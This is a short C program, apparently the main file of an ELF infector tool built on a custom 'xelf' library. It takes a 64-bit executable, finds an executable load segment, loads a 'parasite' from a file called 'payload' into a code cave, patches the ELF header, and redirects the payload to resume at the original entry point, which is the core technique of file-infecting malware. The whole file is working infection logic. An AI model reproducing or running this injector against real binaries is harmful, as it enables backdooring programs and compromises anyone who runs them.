#include "xelf.h"
#include <elf.h>
#include <stdio.h>

int main(int argc, char **argv) {
  if (argc != 2) {
    fprintf(stderr, "Usage: %s <elf_file\n", argv[0]);
    return 1;
  }

  // setup the xelf structure
  struct xelf xelf;
  if (xelf_open(&xelf, argv[1])) {
    fprintf(stderr, "Could not open/map the elf file\n");
    return 2;
  }

  // check if 64bit
  if (xelf.header->e_ident[EI_CLASS] != ELFCLASS64) {
    fprintf(stderr, "Only 64bit elfs are accepted\n");
    xelf_close(&xelf);
    return 3;
  }

  // find a code segment (which will be load and executed) for injection
  Elf64_Phdr *code_seg = xelf_find_seg_by_charac(&xelf, PT_LOAD, (PF_R | PF_X));
  if (!code_seg) {
    fprintf(stderr, "Could not find a code segment !\n");
    xelf_close(&xelf);
    return 5;
  }

  // add the write permission to it for futur self modifying code
  // Maybe we also need to enable it on each sections ? Idk, but should not be
  // hard
  /* xelf_seg_set_flags(code_seg, (PF_R | PF_X | PF_W)); */

  // Load the parasite from the payload file
  struct inject inject;
  xelf_inject_load_from_file(&inject, "payload");

  // We find the cave to put the parasite in, and fill the inject struct
  xelf_inject_set_entrypoint(code_seg, &inject);

  // We patch the header to accomodate our parasite
  xelf_inject_patch_header(&xelf, &inject);

  // Parse the paylod code to replace the placeholder with the original elf
  // entry point
  xelf_inject_set_exitpoint(&inject);

  // Actual injection
  xelf_inject(&xelf, &inject);

  xelf_close(&xelf);
  return 0;
}
